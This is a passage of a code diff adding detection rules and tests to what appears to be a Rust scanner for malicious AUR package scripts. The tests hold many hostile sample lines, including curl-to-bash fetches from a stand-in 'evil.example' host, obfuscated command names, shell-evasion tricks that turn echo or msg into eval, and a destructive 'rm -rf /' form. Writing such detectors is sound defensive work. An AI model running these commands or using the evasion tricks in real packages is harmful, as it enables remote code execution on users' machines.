+            case_sensitive: false,
+        },
 
         // --- additional remote-exec forms ---
         Rule {
@@ -2621,7 +2919,9 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             enabled: true,
             case_sensitive: false,
         },
-    ]
+    ];
+    rules.extend(supplemental::rules());
+    rules
 }
 
 #[cfg(test)]
@@ -2642,7 +2942,7 @@ mod tests {
         //
         // Use a built-ins-ONLY engine here, not RuleEngine::default(): default()
         // also loads community rule files from user_rule_dirs(), so any machine
-        // with a community rule installed (e.g. the shipped example.toml in
+        // with a community rule installed (e.g. the shipped permissions.toml in
         // /usr/share/aur-scanner/rules.d/) would otherwise inflate the count and
         // fail this test for the wrong reason.
         let expected = get_builtin_rules();
@@ -2692,10 +2992,12 @@ mod tests {
         let engine = RuleEngine::default();
         let content = "post_install() {\n  /bin/cat << EOFMSG\n\nAdd to ~/.bashrc:\n  source /usr/share/cdu/cdu.bash\n\nEOFMSG\n}\n";
         let m = engine.match_content(content, FileType::InstallScript);
+        // ENV-003 is Critical and HIDDEN-001 High: a printed heredoc no longer
+        // hides them (it can be faked), so the README text is reported.
         assert!(
-            !m.iter()
+            m.iter()
                 .any(|x| x.rule_id == "ENV-003" || x.rule_id == "HIDDEN-001"),
-            "printed /bin/cat heredoc must not trip ENV-003/HIDDEN-001: {m:?}"
+            "High/Critical rules still see a printed heredoc body: {m:?}"
         );
     }
 
@@ -2925,7 +3227,7 @@ mod tests {
 
     #[test]
     fn variable_indirection_command_is_resolved_and_flagged() {
-        // audit HI-6: a fetch-exec hidden behind a shell variable used to "trip
+        // A fetch-exec hidden behind a shell variable used to "trip
         // nothing"; the resolve pass now exposes it to the catalog.
         let engine = RuleEngine::default();
         for content in [
@@ -3006,7 +3308,7 @@ mod tests {
 
     #[test]
     fn line_continuation_does_not_evade_curl_bash() {
-        // CR-3: the pipe-to-shell is on a backslash-continuation line. The old
+        // The pipe-to-shell is on a backslash-continuation line. The old
         // per-physical-line matcher missed this; logical-line splicing catches it
         // and reports the originating (first) physical line.
         let engine = RuleEngine::default();
@@ -3024,7 +3326,7 @@ mod tests {
 
     #[test]
     fn heredoc_fed_to_interpreter_is_scanned() {
-        // CR-4: a heredoc fed to `bash` executes its body, so a reverse shell in
+        // A heredoc fed to `bash` executes its body, so a reverse shell in
         // it must be detected (it is NOT a printed message).
         let engine = RuleEngine::default();
         let content =
@@ -3066,7 +3368,7 @@ mod tests {
 
     #[test]
     fn bare_monero_address_detected_without_keyword() {
-        // HI-6c: a miner config dropping a bare 95-char Monero address with no
+        // A miner config dropping a bare 95-char Monero address with no
         // `wallet`/`xmr` keyword nearby must still trip CRYPTO-003.
         let engine = RuleEngine::default();
         let addr = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
@@ -3122,18 +3424,56 @@ mod tests {
     }
 
     #[test]
-    fn test_heredoc_message_not_flagged() {
-        // A post_install message printed via `cat <<EOF` mentions ~/.zshrc but
-        // does not modify it; ENV-003/HIDDEN-001 must not fire.
+    fn test_heredoc_message_only_hides_below_high() {
+        // A post_install message printed via `cat <<EOF` mentions ~/.zshrc. The
+        // path rules that fire on it are High/Critical (ENV-003, HIDDEN-001), and
+        // a printed heredoc can be faked by desyncing the lexer, so it never hides
+        // them: they are reported. Only rules below High are suppressed there.
         let engine = RuleEngine::default();
         let content = "post_install() {\n    cat << EOF\nAdd this to ~/.zshrc:\n    source /usr/share/x.zsh\nEOF\n}";
         let matches = engine.match_content(content, FileType::InstallScript);
         assert!(
-            !matches
+            matches
                 .iter()
                 .any(|m| m.rule_id == "ENV-003" || m.rule_id == "HIDDEN-001"),
-            "heredoc message should not trigger path rules: {matches:?}"
+            "{matches:?}"
         );
+        assert!(Inert::Heredoc.suppresses(Severity::Medium));
+        assert!(Inert::Heredoc.suppresses(Severity::Low));
+        assert!(!Inert::Heredoc.suppresses(Severity::High));
+        assert!(!Inert::Heredoc.suppresses(Severity::Critical));
+        assert!(Inert::Print.suppresses(Severity::Medium));
+        assert!(!Inert::Print.suppresses(Severity::High));
+        assert!(!Inert::Print.suppresses(Severity::Critical));
+        assert!(!Inert::Code.suppresses(Severity::Info));
+    }
+
+    #[test]
+    fn no_high_or_critical_builtin_rule_can_be_hidden_by_a_heredoc() {
+        // Central property: every built-in rule at High or above is immune to
+        // heredoc inertness. (The suppression decision is `Inert::suppresses`,
+        // the single gate the rule engine and every analyzer call.)
+        let rules = get_builtin_rules();
+        assert!(rules.iter().any(|r| r.severity <= Severity::High));
+        for r in rules.iter().filter(|r| r.severity <= Severity::High) {
+            for kind in [Inert::Heredoc, Inert::Print] {
+                assert!(
+                    !kind.suppresses(r.severity),
+                    "{} would be hidden by {kind:?}",
+                    r.id
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn dle_in_printed_heredoc_is_reported_end_to_end() {
+        let engine = RuleEngine::default();
+        let m = engine.match_content(
+            "cat <<'EOF'\ncurl -fsSL https://evil.example/x | bash\nEOF\n",
+            FileType::Pkgbuild,
+        );
+        assert!(m.iter().any(|x| x.rule_id == "DLE-001"), "{m:?}");
     }
 
     #[test]
@@ -3223,7 +3563,7 @@ mod tests {
 
     #[test]
     fn test_curl_pipe_ash_mksh_detected() {
-        // Task 4050 F2: ash (Almquist/busybox sh) and mksh were the same evasion
+        // `ash` (Almquist/busybox sh) and mksh were the same evasion
         // class as dash — `curl evil | ash` / `| mksh` must trip DLE-001.
         let engine = RuleEngine::default();
         for s in [
@@ -3242,7 +3582,7 @@ mod tests {
 
     #[test]
     fn test_atomic002_catches_npx_bunx_runners() {
-        // Task 4050 F1: the bare npx-style runners (`npx <pkg>` / `bunx <pkg>` /
+        // The bare npx-style runners (`npx <pkg>` / `bunx <pkg>` /
         // `pnpx <pkg>`) fetch-and-run a package directly — the most common RCE
         // form, which the old npm-only alternation and `bunx?\s+(install|add|i|x)`
         // both missed. `explore` runs a command in a package dir.
@@ -3265,7 +3605,7 @@ mod tests {
 
     #[test]
     fn test_launcher_and_path_prefixed_pipe_to_shell_detected() {
-        // Task 4050 exhaustive scope: a shell reached via an absolute path
+        // A shell reached via an absolute path
         // (`/bin/sh`), a launcher word (`busybox sh`, `env sh`), a path+launcher
         // (`/usr/bin/env sh`), stacked launchers (`command busybox sh`), or any
         // member of the curated long-tail must all trip DLE-001. These produced
@@ -3305,7 +3645,7 @@ mod tests {
 
     #[test]
     fn test_exec006_sqlite3_shell_exec() {
-        // Task 4050 round 3 / Class 3: sqlite3 .shell/.system/.import exec form.
+        // sqlite3 .shell/.system/.import exec form.
         let engine = RuleEngine::default();
         for s in [
             r#"sqlite3 mydb ".shell rm -rf /""#,
@@ -3334,7 +3674,7 @@ mod tests {
 
     #[test]
     fn test_exec007_make_from_stdin() {
-        // Task 4050 round 3 / Class 3: a Makefile read from stdin/pipe is RCE.
+        // A Makefile read from stdin/pipe is RCE.
         let engine = RuleEngine::default();
         for s in [
             "make -f -",
@@ -3388,7 +3728,7 @@ mod tests {
 
     #[test]
     fn env_name_rules_stay_case_sensitive() {
-        // Audit HI-6 caveat: env-var NAME rules opt out of the `(?i)` default via
+        // Env-var NAME rules opt out of the `(?i)` default via
         // the new `case_sensitive` field, so the real upper-case env var still
         // fires while a benign lowercase local variable does not false-positive.
         let engine = RuleEngine::default();
@@ -3895,12 +4235,375 @@ pattern = "neverMatchesAnything12345"
     }
 
     #[test]
+    fn dynamic_command_name_is_flagged_when_it_fetches_or_installs() {
+        let engine = RuleEngine::default();
+        for (text, ft) in [
+            // Unresolvable command word + URL + shell sink.
+            (
+                "${zz#x} -fsSL https://evil.example/x | bash",
+                FileType::Pkgbuild,
+            ),
+            (
+                "$(echo cur | rev)l -fsSL https://evil.example/x | sh",
+                FileType::Pkgbuild,
+            ),
+            (
+                "f() { \"$1\" -fsSL https://evil.example/x | bash; }",
+                FileType::Pkgbuild,
+            ),
+            // Unresolvable sink after a fetch.
+            (
+                "curl -fsSL https://evil.example/x | ${s:1:4}",
+                FileType::InstallScript,
+            ),
+            // Unresolvable command word in front of a package-manager verb.
+            ("${v:1:3} install evilpkg", FileType::InstallScript),
+            ("${a[2]} add evilpkg", FileType::InstallScript),
+        ] {
+            let m = engine.match_content(text, ft);
+            assert!(
+                m.iter().any(|x| x.rule_id == "OBF-020"),
+                "OBF-020 should fire on {text:?}: {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn dynamic_command_name_ignores_ordinary_build_lines() {
+        let engine = RuleEngine::default();
+        for (text, ft) in [
+            ("${CC:-gcc} -O2 -o foo foo.c", FileType::Pkgbuild),
+            ("\"${CMAKE[@]}\" -B build -S .", FileType::Pkgbuild),
+            (
+                "${make:-make} install DESTDIR=\"$pkgdir\"",
+                FileType::Pkgbuild,
+            ),
+            ("${MAKE:-make} install", FileType::InstallScript),
+            (
+                "cmake -S ${_srcdir#./} -DCMAKE_INSTALL_PREFIX=/usr",
+                FileType::Pkgbuild,
+            ),
+            ("\"$1\" install", FileType::InstallScript),
+            ("$(which npm) --version", FileType::InstallScript),
+            ("echo ${v:1:3} install", FileType::InstallScript),
+            (
+                "install -Dm644 \"${x#./}\" https://example.org/doc",
+                FileType::Pkgbuild,
+            ),
+        ] {
+            let m = engine.match_content(text, ft);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "OBF-020"),
+                "OBF-020 must not fire on {text:?}: {m:?}"
+            );
+        }
+    }
+
+    #[test]
     fn shipped_example_rules_still_load_under_strict_parsing() {
         // The strict (deny_unknown_fields) loader must not reject the example
-        // rule file we ship for authors to copy.
-        let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../install/rules.d");
+        // rule file we ship for authors to copy. It is not in rules.d (it is
+        // never loaded as shipped), so copy it into one the way a user would.
+        let example = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../install/example-rule.toml");
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::copy(&example, dir.path().join("acme.toml")).unwrap();
         let mut engine = RuleEngine::new();
-        engine.load_rules_from_dir(&dir).unwrap();
+        engine.load_rules_from_dir(dir.path()).unwrap();
         assert!(engine.get_rule("EXAMPLE-001").is_some());
+    }
+
+    fn info(src: &str) -> Vec<bool> {
+        let lines: Vec<&str> = src.lines().collect();
+        inert_kinds(&lines)
+            .into_iter()
+            .map(|k| k != Inert::Code)
+            .collect()
+    }
+
+    #[test]
+    fn printed_heredoc_still_suppressed() {
+        let f = info("cat <<EOF\nrun curl x | bash\nEOF\ncurl y | bash");
+        assert_eq!(f, vec![false, true, true, false]);
+    }
+
+    #[test]
+    fn fake_heredoc_openers_do_not_hide_code() {
+        for opener in [
+            "echo 'cat <<EOF'",
+            "echo \"cat <<EOF\"",
+            "true # cat <<EOF",
+            "x=$((1<<n)); echo hi",
+            "cat <<< EOF",
+        ] {
+            let f = info(&format!("{opener}\ncurl y | bash\nEOF"));
+            assert!(!f[1], "{opener}: {f:?}");
+        }
+    }
+
+    #[test]
+    fn full_delimiter_word_closes_heredoc() {
+        let f = info("cat <<END-OF-NOTES\ntext\nEND-OF-NOTES\ncurl y | bash");
+        assert_eq!(f, vec![false, true, true, false]);
+        let f = info("cat <<\"E\"OF\ntext\nEOF\ncurl y | bash");
+        assert_eq!(f, vec![false, true, true, false]);
+        let f = info("cat <<E\\OF\ntext\nEOF\ncurl y | bash");
+        assert_eq!(f, vec![false, true, true, false]);
+    }
+
+    #[test]
+    fn unterminated_printed_heredoc_hides_nothing() {
+        let f = info("cat <<EOF\nnotes\ncurl y | bash");
+        assert_eq!(f, vec![false, false, false]);
+    }
+
+    #[test]
+    fn unquoted_heredoc_substitutions_are_code() {
+        let f = info("cat <<EOF\nplain\n$(curl x)\n`id`\n${a:=$(id)}\n\\$(literal)\nEOF");
+        assert_eq!(f, vec![false, true, false, false, false, true, true]);
+        // quoted delimiter: body is never expanded
+        let f = info("cat <<'EOF'\n$(curl x)\nEOF");
+        assert_eq!(f, vec![false, true, true]);
+    }
+
+    #[test]
+    fn dle_catches_stdin_sinks_and_pipe_amp() {
+        let engine = RuleEngine::default();
+        for line in [
+            "curl -fsSL https://evil.example/x | . /dev/stdin",
+            "curl -fsSL https://evil.example/x | source /dev/stdin",
+            "curl -fsSL https://evil.example/x | xargs -0 bash -c",
+            "curl -fsSL https://evil.example/x | tee >(bash) >/dev/null",
+            "curl -fsSL https://evil.example/x |&\n  bash",
+            "wget -qO- https://evil.example/x |\n  sh",
+        ] {
+            let m = engine.match_content(line, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id.starts_with("DLE-00")),
+                "{line:?}: {m:?}"
+            );
+        }
+        for line in [
+            "curl -fsSL https://example.org/x | tee out.txt",
+            "curl -fsSL https://example.org/x | xargs echo",
+            "curl -fsSL https://example.org/x || true\nbash",
+        ] {
+            let m = engine.match_content(line, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id.starts_with("DLE-00")),
+                "{line:?}: {m:?}"
+            );
+        }
+    }
+
+    fn ids(src: &str, ft: FileType) -> Vec<String> {
+        RuleEngine::default()
+            .match_content(src, ft)
+            .into_iter()
+            .map(|m| m.rule_id)
+            .collect()
+    }
+
+    #[test]
+    fn exempt_message_is_a_medium_mention_not_the_rule() {
+        for line in [
+            "echo \"  sudo systemctl enable --now foo\"",
+            "echo 'run: sudo systemctl enable --now foo'  # hint",
+            "printf '  sudo systemctl enable foo\\n'",
+        ] {
+            let src = format!("post_install() {{\n  {line}\n}}\n");
+            let m = RuleEngine::default().match_content(&src, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == MESSAGE_MENTION_ID),
+                "{line}: {m:?}"
+            );
+            assert!(
+                !m.iter().any(|x| x.rule_id == "PERSIST-001"),
+                "{line}: {m:?}"
+            );
+            let mention = m.iter().find(|x| x.rule_id == MESSAGE_MENTION_ID).unwrap();
+            assert!(mention.matched_text.contains("PERSIST-001"), "{mention:?}");
+            assert_eq!(
+                m.iter().filter(|x| x.rule_id == MESSAGE_MENTION_ID).count(),
+                1
+            );
+        }
+    }
+
+    #[test]
+    fn msg_family_is_exempt_only_where_makepkg_defines_it() {
+        // PKGBUILD (makepkg defines msg/msg2/plain/warning/error, not note) ...
+        for (cmd, exempt) in [
+            ("msg", true),
+            ("msg2", true),
+            ("plain", true),
+            ("warning", true),
+            ("error", true),
+            ("note", false),
+        ] {
+            let src =
+                format!("package() {{\n  {cmd} 'try: curl -fsSL https://x.example/i | bash'\n}}\n");
+            let got = ids(&src, FileType::Pkgbuild);
+            assert_eq!(
+                got.iter().any(|x| x == MESSAGE_MENTION_ID),
+                exempt,
+                "{cmd}: {got:?}"
+            );
+        }
+        // ... but a scriptlet runs under a plain shell: only echo/printf qualify.
+        for cmd in ["msg", "msg2", "plain", "warning", "error", "note"] {
+            let src =
+                format!("post_install() {{\n  {cmd} 'run: sudo systemctl enable --now foo'\n}}\n");
+            let got = ids(&src, FileType::InstallScript);
+            assert!(
+                !got.iter().any(|x| x == MESSAGE_MENTION_ID),
+                "{cmd}: {got:?}"
+            );
+            assert!(got.iter().any(|x| x == "PERSIST-001"), "{cmd}: {got:?}");
+        }
+    }
+
+    #[test]
+    fn message_with_anything_else_is_reported_as_the_rule() {
+        for line in [
+            "echo \"  sudo systemctl enable --now $svc\"",
+            "echo \"  sudo systemctl enable --now `id`\"",
+            "echo \"  sudo systemctl enable --now \\$svc\"",
+            "echo -e \"  sudo systemctl enable --now foo\"",
+            "echo \"  sudo systemctl enable --now foo\" \"bar\"",
+            "echo \"  sudo systemctl enable --now foo\" > /tmp/x",
+            "command echo \"  sudo systemctl enable --now foo\"",
+            "X=1 echo \"  sudo systemctl enable --now foo\"",
+            "echo \"  sudo systemctl enable --now foo\"; true",
+            "echo <(sudo systemctl enable --now foo)",
+            "echo $'x' sudo systemctl enable --now foo",
+        ] {
+            let src = format!("post_install() {{\n  {line}\n}}\n");
+            let got = ids(&src, FileType::InstallScript);
+            assert!(
+                !got.iter().any(|x| x == MESSAGE_MENTION_ID),
+                "{line}: {got:?}"
+            );
+        }
+        // after an unclosed quote the print is not a command at all
+        let got = ids(
+            "build() {\n  : \"\n  echo \"x\"; sudo systemctl enable --now foo; : \"\n  \"\n}\n",
+            FileType::Pkgbuild,
+        );
+        assert!(!got.iter().any(|x| x == MESSAGE_MENTION_ID), "{got:?}");
+    }
+
+    #[test]
+    fn redefining_or_trapping_a_printer_turns_the_exemption_off() {
+        let line = "  echo \"  sudo systemctl enable --now foo\"\n";
+        for pre in [
+            "msg() { eval \"$1\"; }\n",
+            "echo() { eval \"$@\"; }\n",
+            "function echo { eval \"$@\"; }\n",
+            "msg() # c\n{ eval \"$1\"; }\n",
+            "ms\\\ng() { eval \"$1\"; }\n",
+            "m\"\"sg() { eval \"$1\"; }\n",
+            "alias echo=eval\n",
+            "enable -n echo\n",
+            "enable -f x.so y\n",
+            "shopt -s extdebug\ntrap 'eval \"$BASH_COMMAND\"' DEBUG\n",
+            "set -T\n",
+            "export BASH_ENV=/tmp/x\n",
+            "builtin() { eval \"$@\"; }\n",
+            "shopt -s expand_aliases\nBASH_ALIASES[msg2]=eval\n",
+            "if :; then \\alias msg2=eval; fi\n",
+            "command_not_found_handle() { bash -c \"$2\"; }\n",
+            "command_not_found_handle() { . /dev/stdin <<< \"$2\"; }\n",
+            "if :; then enable -n echo; fi\n",
+            "builtin enable -n echo\n",
+            "eval 'x=1'\n",
+            "source ./lib.sh\n",
+            "if :; then source ./lib.sh; fi\n",
+            ". ./lib.sh\n",
+            "true; . /dev/stdin <<< \"$x\"\n",
+            "declare -f msg\n",
+            "typeset -f msg\n",
+            "export ENV=/tmp/x\n",
+            "BASH_CMDS[echo]=/tmp/x\n",
+        ] {
+            let src = format!("{pre}post_install() {{\n{line}}}\n");
+            let shadow = ShadowSet::from_text(&src);
+            assert!(
+                shadow.names().contains(shadow::EXEMPTION_BLOCKED),
+                "{pre:?} must block the exemption"
+            );
+            let got = ids(&src, FileType::InstallScript);
+            assert!(
+                !got.iter().any(|x| x == MESSAGE_MENTION_ID),
+                "{pre:?}: {got:?}"
+            );
+            assert!(got.iter().any(|x| x == "PERSIST-001"), "{pre:?}: {got:?}");
+        }
+    }
+
+    #[test]
+    fn source_array_and_prose_do_not_turn_the_exemption_off() {
+        let ok = "source=('a.tar.gz')\nsource_x86_64=('b')\npost_install() {\n  echo \"To enable the service, run: sudo systemctl enable --now foo\"\n}\n";
+        let shadow = ShadowSet::from_text(ok);
+        assert!(!shadow.names().contains(shadow::EXEMPTION_BLOCKED));
+        let shadow = ShadowSet::from_text("source=('a')\nsource \"$srcdir/x.sh\"\n");
+        assert!(shadow.names().contains(shadow::EXEMPTION_BLOCKED));
+        // prose and arch arrays never count; the command forms do
+        let prose = "source_x86_64=('a')\nsource+=('b')\npost_install() {\n  echo 'run: source /etc/profile or log in again'\n  echo \"the aliasing and evaluation docs are fine\"\n}\n";
+        // the android-sdk message keeps the exemption; command forms turn it off
+        let android = "post_install() {\n  echo 'You need to source /etc/profile or relogin to add the Android SDK tools to your path.'\n}\n";
+        assert!(!ShadowSet::from_text(android)
+            .names()
+            .contains(shadow::EXEMPTION_BLOCKED));
+        for cmd in [
+            "source ./x\n",
+            ". ./x\n",
+            "if :; then source x; fi\n",
+            "true && source x\n",
+            "false || . x\n",
+            "x=`source y`\n",
+            "x=$(source y)\n",
+        ] {
+            assert!(
+                ShadowSet::from_text(cmd)
+                    .names()
+                    .contains(shadow::EXEMPTION_BLOCKED),
+                "{cmd:?}"
+            );
+        }
+        // a sentence break after a closing paren is not the `.` builtin
+        let prose2 = "Details (see below). We now put the address in the log.\n";
+        assert!(!ShadowSet::from_text(prose2)
+            .names()
+            .contains(shadow::EXEMPTION_BLOCKED));
+        assert!(!ShadowSet::from_text(prose)
+            .names()
+            .contains(shadow::EXEMPTION_BLOCKED));
+    }
+
+    #[test]
+    fn strict_message_line_shape() {
+        for ok in [
+            "echo \"a b\"",
+            "echo 'a $b'",
+            "msg2 'x'   # note",
+            "printf 'x\\n'",
+            "warning \"say \\\"hi\\\"\"",
+        ] {
+            assert!(strict_message_line(ok, MsgContext::Pkgbuild), "{ok}");
+        }
+        for bad in [
+            "echo",
+            "echo hi",
+            "echo \"$x\"",
+            "echo \"`x`\"",
+            "echo \"a\\$b\"",
+            "echo \"unterminated",
+            "echo 'a' b",
+            "/bin/echo 'a'",
+            "echo $'a'",
+            "echo \"a\"#c",
+        ] {
+            assert!(!strict_message_line(bad, MsgContext::Pkgbuild), "{bad}");
+        }
     }
 }
